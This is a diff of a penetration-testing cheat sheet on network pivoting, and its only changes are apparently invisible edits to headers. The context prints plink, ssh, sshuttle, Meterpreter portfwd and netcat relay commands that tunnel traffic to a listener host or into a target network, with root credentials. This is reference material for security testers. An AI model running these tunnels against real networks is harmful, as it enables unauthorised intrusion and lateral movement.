@@ -1,19 +1,19 @@
 # Pivoting
 
-### Single reverse port forwarding
+### Single reverse port forwarding
 
 ```bash
 plink.exe -l root -pw password -R 445:127.0.0.1:445 <listener_ip>
 ssh -l root -pw password -R 445:127.0.0.1:445 <listener_ip>
 ```
 
-### Single Local port forwarding
+### Single Local port forwarding
 
 ```bash
 ssh -l root -pw password -L 445:127.0.0.1:445 <target>
 ```
 
-### Dynamic port forwarding
+### Dynamic port forwarding
 
 Socks proxy (socks5) 
 
@@ -63,7 +63,7 @@ sshuttle -r <target_ip>:22 <target_network>/24
 
 ---
 
-### Meterpreter
+### Meterpreter
 
 ```sh
 #Socks Proxy
@@ -75,7 +75,7 @@ exploit -j
 portfwd add -l 3389 -p 3389 -r <target>
 ```
 
-### Plink
+### Plink
 
 ```sh
 plink.exe -l root -pw password -R 445:127.0.0.1:445 <listener_ip> [-P <listener_port>] 
@@ -111,7 +111,7 @@ nc -v -lk -p 8001 -e /usr/bin/nc 127.0.0.1 8000
 nc.traditional -l -p 8001 -c "nc 127.0.0.1 8000"
 ```
 
-### [ReGeorg](https://github.com/sensepost/reGeorg)
+### [ReGeorg](https://github.com/sensepost/reGeorg)
 
 Socks proxy over web
 
